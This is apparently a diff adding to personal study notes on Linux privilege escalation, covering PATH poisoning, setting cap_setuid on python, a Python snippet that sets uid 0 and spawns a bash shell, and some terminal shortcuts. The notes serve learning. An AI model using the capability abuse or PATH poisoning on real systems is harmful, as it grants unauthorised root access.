@@ -30,3 +30,26 @@ to set temporary environment variable (for the session)
     
 path poisoning
     export PATH=.:$PATH [searches for the command in the executing folder first]
+
+capabilities 
+    similar to a subset of the sudo command permissions
+    - to set a capability 
+        - sudo setcap cap_setuid+pe python
+            where cap_setuid is the capability 
+            pe means permitted and effective 
+            python is the application 
+        
+        cap_dac_read_search
+
+python code 
+    >>> import os 
+    >>> os.setuid(0)
+    >>> os.system("/bin/bash")
+
+proc stores all the required files for ongoing processes
+
+ctrl+d to exit any interactive session
+ctrl+a to start of the command 
+ctrl+e to end of the command 
+ctrl+u to delete everything before the cursor 
+ctrl+k to delete everything after the cursor 
